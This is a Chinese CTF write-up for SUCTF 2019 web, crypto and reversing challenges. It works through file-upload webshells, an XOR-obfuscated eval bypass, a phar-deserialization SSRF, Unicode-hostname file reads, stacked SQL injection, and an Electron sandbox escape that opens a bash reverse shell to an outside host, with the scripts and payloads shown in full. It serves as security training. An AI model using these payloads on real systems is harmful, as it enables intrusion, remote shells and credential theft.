+    while n >> i:
+    res = query(i)
+    if res:
+    x = 2 * x + 1
+    else:
+    x = 2 * x
+    i += 1
+    print i
+    return (x+1) * n // 2 ** i
+    
+    def query(i):
+    t.sendline('D')
+    t.recvuntil(':')
+    send = (int(c)*pow(2,int(e)*(i+1)))%int(n)
+    t.sendline(str(send))
+    rev = t.recvline()[-5:-2]
+    print rev
+    if rev == 'odd':
+    tmp = 1
+    elif rev == 'ven':
+    tmp = 0
+    else:
+    print 'eve odd error'
+    exit()
+    t.recvline()
+    t.recvline()
+    t.recvline()
+    t.recvline()
+    t.recvuntil('option:')
+    return tmp
+    
+    if __name__ == "__main__":
+    t = remote('47.111.59.243', 9421)
+    proof = t.recvline()
+    print proof
+    check = proof[-6:-1]
+    salt = proof[-20:-16]
+    for i in range(10000000):
+    if hashlib.md5(str(i)+salt).hexdigest()[0:5] == check:
+    break
+    t.sendline(str(i))
+    print t.recvline()
+    print t.recvline()
+    #round1
+    n = int(t.recvline()[4:-1])
+    print int(n)
+    e = int(t.recvline()[4:-1])
+    print int(e)
+    print t.recvline()
+    c = int(t.recvline()[4:-1])
+    print int(c)
+    print t.recvline()
+    print t.recvline()
+    print t.recvline()
+    print t.recvline()
+    print t.recvuntil(':')
+    m = parity_oracle(n)
+    print m
+    print c == pow(m,e,n)
+    t.sendline('G')
+    print t.recvuntil(':')
+    t.sendline(str(m))
+    print t.recvline()
+    print t.recvline()
+    #round2
+    n = int(t.recvline()[4:-1])
+    print int(n)
+    e = int(t.recvline()[4:-1])
+    print int(e)
+    print t.recvline()
+    c = int(t.recvline()[4:-1])
+    print int(c)
+    print t.recvline()
+    print t.recvline()
+    print t.recvline()
+    print t.recvline()
+    print t.recvuntil(':')
+    m = parity_oracle(n)
+    print m
+    print c == pow(m, e, n)
+    t.sendline('G')
+    print t.recvuntil(':')
+    t.sendline(str(m))
+    print t.recvline()
+    print t.recvline()
+    #round3
+    n = int(t.recvline()[4:-1])
+    print int(n)
+    e = int(t.recvline()[4:-1])
+    print int(e)
+    print t.recvline()
+    c = int(t.recvline()[4:-1])
+    print int(c)
+    print t.recvline()
+    print t.recvline()
+    print t.recvline()
+    print t.recvline()
+    print t.recvuntil(':')
+    m = parity_oracle(n)
+    print m
+    print c == pow(m, e, n)
+    t.sendline('G')
+    print t.recvuntil(':')
+    t.sendline(str(m))
+    print t.recvline()
+    print t.recvline()
+    
+    print t.recvline()
+    print t.recvline()
+    
+
+## Web
+
+###  0x01 CheckIn
+
+**题目描述**
+
+<http://47.111.59.243:9021>
+
+**题目解答**
+
+首先判断目标题目的容器环境，发现是nginx而不是apache
+
+之后发现上传点具有如下特征：
+
+  1. `.php` 后缀的不可以
+  2. `<?` 不可以出现
+  3. `exif_imagetype` 检验是否是图片
+
+那么就逐点bypass;
+
+  1. 不允许php后缀的情况下就要考虑容器的特性  
+容器是否存在解析漏洞或者其他，如果是apache的话我们完全可以先上传`.htaccess`来将某个后缀当做php脚本解析执行，但是此处是nginx容器，在这个版本也没有对应的解析漏洞，因此考虑`.user.ini`来构造解析  
+这个可以参考：[《user.ini文件构成的PHP后门》](https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html)
+
+  2. 不允许`<?` 那么就考虑`<script language='php'>`
+  3. `exif_imagetype` 校验bypass  
+这个可以参考这篇文章：<https://xz.aliyun.com/t/3937>
+
+最终得到如下getshell脚本
+
+    
+    
+    import requests
+    import base64
+    
+    url = "http://47.111.59.243:9021/"
+    
+    
+    htaccess = b"""x00x00x8ax39x8ax39
+    auto_prepend_file = cc.jpg
+    """
+    
+    #shell = b"x00x00x8ax39x8ax39"+b"00"+ base64.b64encode(b"<?php eval($_GET['c']);?>")
+    shell =  b"x00x00x8ax39x8ax39"+b"00" + "<script language='php'>eval($_REQUEST[c]);</script>"
+    
+    files = [('fileUpload',('.user.ini',htaccess,'image/jpeg'))]
+    
+    data = {"upload":"Submit"}
+    
+    proxies = {"http":"http://127.0.0.1:8080"}
+    print("upload .user.ini")
+    r = requests.post(url=url, data=data, files=files)#proxies=proxies)
+    
+    print(r.text) 
+    
+    print("upload cc.jpg")
+    
+    files = [('fileUpload',('cc.jpg',shell,'image/jpeg'))]
+    r = requests.post(url=url, data=data, files=files)
+    print(r.text)
+    
+    
+    
+    GET /uploads/0ec1db6cfe0333559b8991ce81e48662/index.php?c=system(%27cat%20/flag%27); HTTP/1.1
+    Host: 47.111.59.243:9021
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Connection: close
+    Upgrade-Insecure-Requests: 1
+    If-Modified-Since: Sat, 17 Aug 2019 02:28:39 GMT
+    If-None-Match: "5d576657-74"
+    
+
+直接cat得到flag
+
+![](https://github.com/KCTF/kctf.github.io/blob/master/images/formd/suctf2019/CDE4B672-51B6-4029-B4F6-12E88C73D62D.png?raw=true)
+
+###  0x02 EasyPHP
+
+**题目描述**
+
+<http://47.111.59.243:9001/>
+
+**题目解答**
+
+访问站点直接得到网站对应的源代码
+
+    
+    
+    <?php
+    function get_the_flag(){
+        // webadmin will remove your upload file every 20 min!!!! 
+        $userdir = "upload/tmp_".md5($_SERVER['REMOTE_ADDR']);
+        if(!file_exists($userdir)){
+        mkdir($userdir);
+        }
+        if(!empty($_FILES["file"])){
+            $tmp_name = $_FILES["file"]["tmp_name"];
+            $name = $_FILES["file"]["name"];
+            $extension = substr($name, strrpos($name,".")+1);
+        if(preg_match("/ph/i",$extension)) die("^_^"); 
+            if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die("^_^");
+        if(!exif_imagetype($tmp_name)) die("^_^"); 
+            $path= $userdir."/".$name;
+            @move_uploaded_file($tmp_name, $path);
+            print_r($path);
+        }
+    }
+    
+    $hhh = @$_GET['_'];
+    
+    if (!$hhh){
+        highlight_file(__FILE__);
+    }
+    
+    if(strlen($hhh)>18){
+        die('One inch long, one inch strong!');
+    }
+    
+    if ( preg_match('/[x00- 0-9A-Za-z'"`~_&.,|=[x7F]+/i', $hhh) )
+        die('Try something else!');
+    
+    $character_type = count_chars($hhh, 3);
+    if(strlen($character_type)>12) die("Almost there!");
+    
+    eval($hhh);
+    ?>
+    
+
+看到源码之后思路就很明确了，`get_the_flag`
+函数部分的上传漏洞和上题相类似，但是不同的是这里是`apache`环境，所以要上传的是`.htaccess`文件来构造解析。
+
+关键的是第一部分，如何来让`eval` 函数触发`get_the_flag` 函数，首先判断正则过滤了那些ascii字符，写一个脚本判断一下。
+
+    
+    
+    <?php
+    
+    $unfilter_str = array();
+    
+    for ($ascii = 0; $ascii < 256; $ascii++) {
+    
+        if (!preg_match('/[x00- 0-9A-Za-z'"`~_&.,|=[x7F]+/i', chr($ascii))) {
+            $unfilter_str[] = urlencode(chr($ascii));
+        }
+    print_r(''' . implode('','', $unfilter_str) . ''');
+    }
+    ?>
+    
+
+最终可以得到有如下
+
+    
+    
+    ['%21','%23','%24','%25','%28','%29','%2A','%2B','-','%2F','%3A','%3B','%3C','%3E','%3F','%40','%5C','%5D','%5E','%7B','%7D','%80','%81','%82','%83','%84','%85','%86','%87','%88','%89','%8A','%8B','%8C','%8D','%8E','%8F','%90','%91','%92','%93','%94','%95','%96','%97','%98','%99','%9A','%9B','%9C','%9D','%9E','%9F','%A0','%A1','%A2','%A3','%A4','%A5','%A6','%A7','%A8','%A9','%AA','%AB','%AC','%AD','%AE','%AF','%B0','%B1','%B2','%B3','%B4','%B5','%B6','%B7','%B8','%B9','%BA','%BB','%BC','%BD','%BE','%BF','%C0','%C1','%C2','%C3','%C4','%C5','%C6','%C7','%C8','%C9','%CA','%CB','%CC','%CD','%CE','%CF','%D0','%D1','%D2','%D3','%D4','%D5','%D6','%D7','%D8','%D9','%DA','%DB','%DC','%DD','%DE','%DF','%E0','%E1','%E2','%E3','%E4','%E5','%E6','%E7','%E8','%E9','%EA','%EB','%EC','%ED','%EE','%EF','%F0','%F1','%F2','%F3','%F4','%F5','%F6','%F7','%F8','%F9','%FA','%FB','%FC','%FD','%FE','%FF']
+    
+
+那么之后只要使用既有的规则模式进行fuzz即可（随后会写专门的文章来介绍webfuzz）
+
+因为还有长度限制，所以如果fuzz出`get_the_flag`的话，可能长度会超，所以考虑率fuzz出`$_GET[z]`，然后让php解析`${$_GET[z]}`来达到调用对应函数的目的。
+
+这里fuzz字符之间的异或，最终得到如下结果
+
+    
+    
+    <?
+    // fuzz_api.php
+    $_=$_GET['a']^$_GET['b'];
+    // $_ = '%fe%fe%fe%fe^%a1%b9%bb%aa';
+    if($_ == '_GET')print_r('true');
+    ?>
+    
+
+因为可见字符都被过滤了，这里我们还得要一个字符来作为参数，同时要考虑bypass
+
+    
+    
+    $character_type = count_chars($hhh, 3);
+    if(strlen($character_type)>12) die("Almost there!");
+    
+
+所以简单的做法就是把上面的可用字符串再给fuzz一遍，最终得到如下payload
+
+    
+    
+    ${%fe%fe%fe%fe^%a1%b9%bb%aa}{%fe}();
+    
+
+所以我们就可以写脚本来一键getshell了
+
+    
+    
+    import requests
+    import base64
+    
+    url = "http://47.111.59.243:9001/?_=${%fe%fe%fe%fe^%a1%b9%bb%aa}{%fe}();&%fe=get_the_flag"
+    
+    
+    htaccess = b"""x00x00x8ax39x8ax39
+    AddType application/x-httpd-php .zzzz
+    php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_13c21ab4858db269eab22891ac26c5be/shell.zzzz"
+    """
+    
+    shell = b"x00x00x8ax39x8ax39"+b"00"+ base64.b64encode(b"<?php eval($_GET['c']);?>")
+    # shell =  b"x00x00x8ax39x8ax39"+b"00" + "<script language='php'>eval($_REQUEST[c]);</script>"
+    
+    files = [('file',('.htaccess',htaccess,'image/jpeg'))]
+    
+    data = {"upload":"Submit"}
+    
+    # proxies = {"http":"http://127.0.0.1:8080"}
+    print("upload .htaccess")
+    r = requests.post(url=url,files=files)
+    
+    # print(r.text) 
+    
+    print("upload shell.zzzz")
+    
+    files = [('file',('shell.zzzz',shell,'application/octet-stream'))]
+    r = requests.post(url=url,files=files)
+    
+    # r = requests.get('http://47.111.59.243:9001/upload/tmp_13c21ab4858db269eab22891ac26c5be/shell.zzzz?c=system(%27ls%27);')
+    # r = requests.get("http://47.111.59.243:9001/upload/tmp_13c21ab4858db269eab22891ac26c5be/shell.zzzz?c=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(scandir('/'));")
+    r = requests.get("http://47.111.59.243:9001/upload/tmp_13c21ab4858db269eab22891ac26c5be/shell.zzzz?c=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(file_get_contents('/THis_Is_tHe_F14g'));")
+    print r.text
+    
+
+最终得到flag
+
+![](https://github.com/KCTF/kctf.github.io/blob/master/images/formd/suctf2019/EA4BD431-2FDC-48FC-8B9F-52C77D727628.png?raw=true)
+
+###  0x03 Pythonginx
+
+**题目描述**
+
+<http://47.111.59.243:9000/>
+
+**题目解答**
+
+右键直接看到题目的源代码（完好格式）
+
+    
+    
+    @app.route('/getUrl', methods=['GET', 'POST'])
+    def getUrl():
+        url = request.args.get("url")
+        host = parse.urlparse(url).hostname
+        if host == 'suctf.cc':
+            return "我扌 your problem? 111"
+        parts = list(urlsplit(url))
+        host = parts[1]
+        if host == 'suctf.cc':
+            return "我扌 your problem? 222 " + host
+        newhost = []
+        for h in host.split('.'):
+            newhost.append(h.encode('idna').decode('utf-8'))
+        parts[1] = '.'.join(newhost)
+        #去掉 url 中的空格
+        finalUrl = urlunsplit(parts).split(' ')[0]
+        host = parse.urlparse(finalUrl).hostname
+        if host == 'suctf.cc':
+            return urllib.request.urlopen(finalUrl).read()
+        else:
+            return "我扌 your problem? 333"
+    
+
+看到这个代码立马想到最近blackhat大会上公布的几个trick，具体链接如下
+
+<https://bugs.python.org/issue36742>
+
+<https://bugs.python.org/issue36216>
+
+<https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf>
+
+网页源码的注释上也有提示
+
+    
+    
+        <!-- Dont worry about the suctf.cc. Go on! -->
+        <!-- Do you know the nginx? -->
+    
+
+所以我们结合上面的信息，来构造payload如下:
+
+    
+    
+    url=file://suctf.c%E2%84%82/../../../etc/passwd
+    
+
+此处用于构造c的字符来源
+
+<https://en.wiktionary.org/wiki/Appendix:Unicode/Letterlike_Symbols>
+
+经过一番fuzz，在配置文件中读到flag的路径和名称
+
+    
+    
+    url=file://suctf.c%E2%84%82/../../../usr/local/nginx/conf/nginx.conf
+    
+    
+    
+    server {
+        listen 80;
+        location / {
+            try_files $uri @app;
+        }
+        location @app {
+            include uwsgi_params;
+            uwsgi_pass unix:///tmp/uwsgi.sock;
+        }
+        location /static {
+            alias /app/static;
+        }
+        # location /flag {
+        #     alias /usr/fffffflag;
+        # }
+    }
+    
+
+最终读到flag
+
+    
+    
+    url=file://suctf.c%E2%84%82/../../../usr/fffffflag
+    
+
+![](https://github.com/KCTF/kctf.github.io/blob/master/images/formd/suctf2019/12C801C2-3D42-43C5-8A68-7F8A2613DDD8.png?raw=true)
+
+如果你的字典不够给力，fuzz不到的话，不妨试试这个
+
+<https://github.com/zer0yu/Berserker/blob/master/webfuzz/fi/lfi.txt>
+
+###  0x04 easy_sql
+
+**题目描述**
+
+<http://47.111.59.243:9061>
+
+**题目解答**
+
+显示随便测了一下，发现一般会有以下四种返回结果
+
+    
+    
+    1. query=1e100
+    
+    Array
+    (
+        [0] => 1
+    )
+    
+    2.    query=0x730065006c0065006300740020004000400076006500%20%2e%2e%2e
+    
+    Too long.
+    
+    3.    query=1)%20or%20benchmark(10000000,MD5(1))#
+    
+    Nonono.
+    
+    4.    query=NULL
+    
+    Array
+    (
+        [0] => 
+    )
+    
+
+可以看到字符长度是有限制的，而且过滤了一些关键词
+
+之后fuzz测试的过程中发现是堆叠注入
+
+    
+    
+    # 显示数据库
+    query=1; show databases;
+    # 回显
+    Array
+    (
+        [0] => 1
+    )
+    Array
+    (
+        [0] => information_schema
+    )
+    Array
+    (
+        [0] => CTF
+    )
+    Array
+    (
+        [0] => mysql
+    )
+    Array
+    (
+        [0] => performance_schema
+    )
+    Array
+    (
+        [0] => score_mbamission
+    )
+    Array
+    (
+        [0] => score_minnesotaunited
+    )
+    
+    
+    
+    # 回显表名
+    query=1; show tables;
+    Array
+    (
+        [0] => 1
+    )
+    Array
+    (
+        [0] => Flag
+    )
+    
+    
+    
+    # 但是过滤了from
+    query=1; select * from Flag;
+    # 回显
+    Nonono.
+    # 这样也不行
+    query=1; SET @SQL=0x73656c656374202a2066726f6d20466c61673b;PREPARE pord
+    
+
+所以最后解决方法是
+
+    
+    
+    # 直接输出flag
+    query=*,1
+    # 回显
+    Array
+    (
+        [0] => SUCTF{SUCTF_baby_sql_chall_120993n810h3}
+        [1] => 1
+    )
+    
+
+别问，问就是fuzz
+
+<https://github.com/zer0yu/Berserker/blob/master/webfuzz/sqli/sql_fuzz.txt>
+
+###  0x05 Upload labs 2
+
+**题目描述**
+
+去看看你自己到底传了个啥 <http://47.111.59.243:9025/> 交flag时去掉引号
+
+**题目解答**
+
+题目有附件，所以是一个代码审计题目，先看最终怎么可以getflag，发现有对应的函数，在`admin.php`中
+
+    
+    
+        function __destruct(){
+            getFlag($this->ip, $this->port);
+            //使用你自己的服务器监听一个确保可以收到消息的端口来获取flag
+        }
+    
+
+而且还限制了必须是本地来访问这个`admin.php`文件
+
+    
+    
+    if($_SERVER['REMOTE_ADDR'] == '127.0.0.1'){
+        if(isset($_POST['admin'])){
+    
+
+所以目标很明确，就是要ssrf的点来触发这个，从而把flag发给我
+
+但是很尴尬的是在`func.php`中的正则，过滤掉了`phar`这个关键字，所以初看，感觉点没有办法触发，但是后面经过分析正则的话，发现使用如下方式可以bypass掉这个正则过滤，进而触发phar反序列化。
+
+    
+    
+    php://filter/read=convert.base64-encode/resource=phar://poc.phar
+    
+
+之所以想到这个phar文件，是因为这是一个上传题，而且存在一个疑似phar反序列化的触发点—`func.php`中的这几行代码
+
+    
+    
+    $file_path = $_POST['url'];
+    $file = new File($file_path);
+    $file->getMIME();
+    echo "<p>Your file type is '$file' </p>";
+    
+
+具体来说就是`getMIME()`函数中的`finfo_open`函数
+
+    
+    
+    function getMIME(){
+        $finfo = finfo_open(FILEINFO_MIME_TYPE);
+        $this->type = finfo_file($finfo, $this->file_name);
+        finfo_close($finfo);
+    }
+    
+
+但是网站并没有公开说明这个函数可以触发phar反序列化，我是怎么知道的呢？
+
+zsx师傅曾在他的文章[《Phar与Stream Wrapper造成PHP
+RCE的深入挖掘》](https://blog.zsxsoft.com/post/38)写到，只要函数在底层调用了这个`php_stream_locate_url_wrapper`函数，那么就能触发phar反序列化，而`finfo_open`函数在底层恰好就是使用了这个函数。（其实这个点本地盲打也能触发，所以发现的话也不难）
+
+ext/fileinfo/fileinfo.c:517
+
+![](https://github.com/KCTF/kctf.github.io/blob/master/images/formd/suctf2019/7F3C92B8-95A2-47A7-8C89-EAEE4EB9B696.png?raw=true)
+
+到此为止反序列化已经完整了，那么怎么进行ssrf呢？很容易联想到之前`wupco`出的easyphp中的`SoapClient`，所以就可以构造如下payload
+
+    
+    
+    <?php
+    
+    class File{
+    
+        public $file_name;
+        public $type;
+        public $func = "SoapClient";
+    
+        function __construct(){
+            // $this->file_name = array(null, array('location' => "http://127.0.0.1/admin.php", 'uri' => "123", 'user_agent' => "heiheirnContent-Type: application/x-www-form-urlencodedrnContent-Length: 133rnrnip=47.90.204.28&port=2333&admin=123&clazz=ArrayIterator&func1=append&func2=append&func3=append&arg1=1&arg2=1&arg3=1rnrnrn"));
+    
+            $this->file_name = array(null, array('location' => "http://127.0.0.1/admin.php", 'uri' => "123", 'user_agent' => "heiheirnContent-Type: application/x-www-form-urlencodedrnContent-Length: 133rnrnip=47.90.204.28&port=2333&admin=123&clazz=SplStack&func1=push&func2=push&func3=push&arg1=1&arg2=1&arg3=1rnrnrn"));
+        }
+    
+    }
+    
+    $o = new File();
+    $filename = 'poc.phar';
+    file_exists($filename) ? unlink($filename) : null;
+    $phar=new Phar($filename);
+    $phar->startBuffering();
+    $phar->setStub("GIF89a< ?php __HALT_COMPILER(); ?>");
+    $phar->setMetadata($o);
+    $phar->addFromString("foo.txt","bar");
+    $phar->stopBuffering();
+    
+
+修改后缀为`gif`之后上传得到上传路径来触发
+
+    
+    
+    php://filter/read=convert.base64-encode/resource=phar://upload/8256248f8bb97051ddea1f7946057e08/2d32ae0bbeb53285459d07235d464102.gif
+    
+
+直接得到flag
+
+![](https://github.com/KCTF/kctf.github.io/blob/master/images/formd/suctf2019/AEA5041C-692A-4DB0-98F3-FE334A07A196.png?raw=true)
+
+###  0x06 Cocktail’s Remix
+
+**题目描述**
+
+<http://47.111.59.243:9016/>
+
+**题目解答**
+
+访问 <http://47.111.59.243:9016/>
+
+发现回显的是 It Works!
+
+所以尝试爆破路径
+
+结果发现 <http://47.111.59.243:9016/robots.txt>
+
+    
+    
+    User-agent: *
+    Disallow: /info.php
+    Disallow: /download.php
+    Disallow: /config.php
+    
+
+存在任意文件下载漏洞 <http://47.111.59.243:9016/download.php>
+
+参数是fuzz出来的`filename`（字典链接同上）
+
+![](https://github.com/KCTF/kctf.github.io/blob/master/images/formd/suctf2019/BA49C246-7822-4530-BEB6-8F3E7107851E.png?raw=true)
+
+继续使用上述字典进行fuzz，筛选出有价值的信息如下
+
+从`/etc/hosts`发现是存在内网的mysql服务器的
+
+    
+    
+    # /etc/hosts
+    127.0.0.1       localhost
+    ::1     localhost ip6-localhost ip6-loopback
+    fe00::0 ip6-localnet
+    ff00::0 ip6-mcastprefix
+    ff02::1 ip6-allnodes
+    ff02::2 ip6-allrouters
+    172.77.120.11   MysqlServer
+    172.77.120.10   f8a7f2ca8591
+    
+
+继续读源码
+
+    
+    
+    # download.php
+    <?php 
+        $filename = $_GET['filename'];
+        header("Content-Disposition: attachment;filename=".$filename);
+        header('Content-Length: '.filesize($filename));
+        readfile($filename);
+    ?>
+    
+
+看到读出了MySQL的账号密码
+
+    
+    
+    # config.php
+    <?php
+        //$db_server = "MysqlServer";
+        //$db_username = "dba";
+        //$db_password = "rNhHmmNkN3xu4MBYhm";    
+    ?>
+    
+
+还有一个phpinfo页面
+
+    
+    
+    # info.php
+    <?php
+        phpinfo();
+    ?>
+    
+
+在页面上没有发现常规漏洞，但是发现了一个与题目名称类似的扩展模块
+
+所以尝试进行下载 `/usr/lib/apache2/modules/mod_cocktail.so`
+
+先用file命令看了一下，发现是64位程序，所以使用IDA Pro直接来进行分析
+
+![](https://github.com/KCTF/kctf.github.io/blob/master/images/formd/suctf2019/52722269-5528-4210-AAD5-B278614FD402.png?raw=true)
+
+直接定位到关键函数，可以看到其中使用了`popen`函数来执行经过`j_remix`函数处理的`reffer`变量，所以基本可以判定此处是存在一个命令执行的后门。
+
+![](https://github.com/KCTF/kctf.github.io/blob/master/images/formd/suctf2019/C4D0A50A-E002-4320-8503-2C3570E9A3DB.png?raw=true)
+
+`j_remix`函数是调用了`remix`函数，看起来比较复杂，但应该是某种编码方式
+
+![](https://github.com/KCTF/kctf.github.io/blob/master/images/formd/suctf2019/2401F6EC-FAAD-4AD3-A254-B1A7B5411AC5.png?raw=true)
+
+此处使用IDA的findcrypt插件，直接发现了base64表，所以猜测是base64编码
+
+![](https://github.com/KCTF/kctf.github.io/blob/master/images/formd/suctf2019/BE1138CB-7F30-4541-B3AB-8E9B5B828077.png?raw=true)
+
+那么接下来可以测一下这个后门，可以看到成功回显
+
+![](https://github.com/KCTF/kctf.github.io/blob/master/images/formd/suctf2019/F22B1242-EFDD-483F-AB02-18C262DF8CEF.png?raw=true)
+
+可以看到没有权限写webshell
+
+![](https://github.com/KCTF/kctf.github.io/blob/master/images/formd/suctf2019/FF485A77-74E1-4E41-82CA-086B1F045092.png?raw=true)
+
+所以可能稍微麻烦一点，我们得用之前得到的mysql账号密码来查看数据库的内容
+
+    
+    
+    mysql -hMysqlServer -udba -prNhHmmNkN3xu4MBYhm -e "show databases;" > /tmp/zero.txt && cat /tmp/zero.txt && rm /tmp/zero.txt
+    
+
+![](https://github.com/KCTF/kctf.github.io/blob/master/images/formd/suctf2019/68872B88-735E-49F6-A900-A12F57569938.png?raw=true)
+
+    
+    
+    mysql -hMysqlServer -udba -prNhHmmNkN3xu4MBYhm -e "use flag;show tables;" > /tmp/zero.txt && cat /tmp/zero.txt && rm /tmp/zero.txt
+    
+
+![](https://github.com/KCTF/kctf.github.io/blob/master/images/formd/suctf2019/A70813D1-5BD6-4CC7-A1F7-7A98FA6341B2.png?raw=true)
+
+    
+    
+    mysql -hMysqlServer -udba -prNhHmmNkN3xu4MBYhm -e "use flag;select * from flag;" > /tmp/zero.txt && cat /tmp/zero.txt && rm /tmp/zero.txt
+    
+
+![](https://github.com/KCTF/kctf.github.io/blob/master/images/formd/suctf2019/2A034AD6-0DFB-4FBD-A607-D299ACD5DFF1.png?raw=true)
+
+###  0x07 Game
+
+**题目描述**
+
+How fast can you play?
+
+<http://47.111.59.243:1081>
+
+**题目解答**
+
+直接查看源代码得到flag（假的，emmmm
+
+view-source:<http://47.111.59.243:1081/>
+
+    
+    
+        <div class="text text--best-time">
+          <icon trophy></icon>
+          <span>Well done!，
+          here is your flag:ON2WG5DGPNUECSDBNBQV6RTBNMZV6RRRMFTX2===      </span>
+        </div>
+      </div>
+    
+
+base32后得到flag
+
+    
+    
+    suctf{hAHaha_Fak3_F1ag}
+    
+
+既然是个游戏就有可能是改的开源代码，所以抱这这种想法就去找了源码，就找到了
+
+<http://www.jq22.com/jquery-info21216>
+
+然后从里面diff出不同点
+
+![](https://github.com/KCTF/kctf.github.io/blob/master/images/formd/suctf2019/71F7F13A-9AB1-4D56-BCE1-38E2BD91E070.png?raw=true)
+
+    
+    
+    var acd = mysecretishere.iZwz9i9xnerwj6o7h40eauZ.png;
+    
+
+之后下载图片
+
+    
+    
+    wget http://47.111.59.243:1081/iZwz9i9xnerwj6o7h40eauZ.png
+    
+
+分析之后发现是lsb隐写
+
+![](https://github.com/KCTF/kctf.github.io/blob/master/images/formd/suctf2019/0E0DEF7B-AD12-434C-A7F2-6640F150B0C7.png?raw=true)
+
+    
+    
+    U2FsdGVkX1+zHjSBeYPtWQVSwXzcVFZLu6Qm0To/KeuHg8vKAxFrVQ==
+    
+
+使用3des解密即可得到flag
+
+![](https://github.com/KCTF/kctf.github.io/blob/master/images/formd/suctf2019/30A0E76B-7523-477C-88FB-E400F79C097A.png?raw=true)
+
+###  0x08 iCloudMusic-WriteUp
+
+首先下载附件，可以看出是一个nodejs写的App，采用了electron框架。其实就是将网页封装为了一个App。所以还是一道web题。尝试对其逆向解包。
+
+> mac环境
+
+首先进入该App包目录。可以在以下目录发现一个app.asar文件，该文件为App核心代码。逆向其即可。在这里采用官方的解包就可以。
+
+    
+    
+    # iCloudMusic.app/Contents/Resources/
+    # 复制备份到工作目录
+    cp ./app.asar /tmp/app.asar
+    cd /tmp
+    # 安装 asar 包
+    npm install asar
+    # 逆向app.asar
+    asar extract app.asar app
+    cd app
+    
+    # 安装App运行依赖
+    npm install、
+    # 启动App
+    npm start
+    
+
+按以上步骤，即可以源码形式跑起来这个应用。
+
+跑起来，大概看一下逻辑，发现存在一个向管理员反馈的接口。此时80%确定是一个xss题目了。然后再分析源码。可以发现250多行这里，有一个代码执行。其中是直接拼接了一些内容。然后使用view的`executeJavaScript`方法进行代码执行。
+
+![](https://img.5am3.com/20190820156627877052690.png?raw=true)
+
+继续分析，可以管理员反馈接口处参数如下：
+
+    
+    
+    id=2810583532
+    &music={"header":"xxxx","title":"xxxx","desc":"xxx"}
+    &code=612346
+    
+
+根据以上内容， 大胆猜测，小心求证。尝试对header进行注入(可以本地先尝试js_to_run代码注入后是否可以运行，然后再打远程)。
+
+开启本地调试环境，加入调试代码。然后再运行。
+
+    
+    
+    // index.js
+    
+    //在22行左右添加如下代码，开启开发者工具。
+    mainWindow.openDevTools();
+    
+
+最终music的poc
+
+    
+    
+    {"header":"'var t = new XMLHttpRequest;t.open('POST', '//eval.com:port', !0),t.setRequestHeader('Content-type', 'text/plain'),t.onreadystatechange = function() {  4 == t.readyState && t.status},t.send('test,hhhh');//};","title":"xxxx","desc":"xxx"}
+    
+
+此时xss成功get，但是尝试读了很多东西，发现没啥用。询问出题人才知道，这题要getshell。
+
+electron有一个危害，就是可以直接调用系统api，所以可以直接getshell。但是尝试无果。最终发现，原来是view搞的鬼。正如之前所说，是调用view的方法，执行js。
+
+分析可以发现，这个view是一个webview窗口，相当于是一个沙盒。默认是没有办法调用系统api的。
+
+此时需要想办法来做一个沙盒逃逸。根据hint：contextisolation，以及文章，可以了解到。
+
+由于contextisolation关闭，可以导致webview沙盒内与pr.js内变量在同一作用域，可以覆盖pr.js的变量。而且pr.js是不在沙盒运行限制内。所以，只要想办法覆盖掉pr.js的函数调用逻辑，即可绕过webview沙盒。
+
+可以在main.js中，插入以下代码，开启webview沙盒的开发者工具。
+
+    
+    
+    // main.js
+    
+    webview = document.getElementById("view");
+    webview.addEventListener("dom-ready", function() {
+      webview.openDevTools();
+    });
+    
+
+比赛时，审request源码，动态跟逻辑，尝试了半天。最终还是太菜了。fuzz也尝试了。但是奈何自己考虑不周。
+
+最后看了wp，才发现自己还是经验不足，学到了很多。
+
+自己的payload：
+
+    
+    
+    Function.prototype.apply=function(process){
+            process.mainModule.require('child_process').exec('bash -c "bash -i >& /dev/tcp/XXXXXX/8080 0>&1"');
+    }
+    request.get('http://www.baidu.com/',null)
+    
+
+虽然仅仅是差了一步保存状态，但是自己确实一直以来从未考虑过这个问题，认为只有实战中才要考虑
+，CTF就是瞎鸡儿日就ok了。看似一步之差，差的缺很多很多。尤其是看完wp。
+
+比如： **一定要不破坏环境，考虑周全。一定要不破坏环境，考虑周全。一定要不破坏环境，考虑周全。**
+
+最终沙盒逃逸代码如下：
+
+    
+    
+    Function.prototype.apply2=Function.prototype.apply;
+    Function.prototype.apply=function(...args){
+        if(args[0]!=null && args[0]!=undefined && args[0].env!=undefined){
+            Function.prototype.apply=Function.prototype.apply2;
+            args[0].mainModule.require('child_process').exec('bash -c "bash -i >& /dev/tcp/XXXXXX/8080 0>&1"');
+            }
+            return this.apply2(...args)
+    }
+    request.get('http://www.baidu.com/',null)
+    
+
+## 参考资料
+
+  * [测试 Electron 应用的基本指南](https://xz.aliyun.com/t/2461)
+  * [Electron: Abusing the lack of context isolation – CureCon(en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en)
+
+## re
+
+###  hardCpp
+
+程序核心的加密与验证部分如下图所示,需要注意关于时间的反调试与干扰变量
+
+![](https://github.com/KCTF/kctf.github.io/blob/master/images/formd/suctf2019/re1.png?raw=true)
+
+观察输出信息：func(?)=”01abfc750a0c942167651c40d088531d”?”。
+
+md5解密后为字符‘#’,说明第一个字符必须是‘#’，然后爆破即可,脚本如下。
+
+    
+    
+    hexData = [0xF3, 0x2E, 0x18, 0x36, 0xE1, 0x4C, 0x22, 0xD1, 0xF9, 0x8C, 0x40, 0x76, 0xF4, 0x0E, 0x00, 0x05,
+        0xA3, 0x90, 0x0E, 0xA5 ]
+    a=ord('#')
+    flag=''
+    for i in range(20):
+        for j in range(33,127):
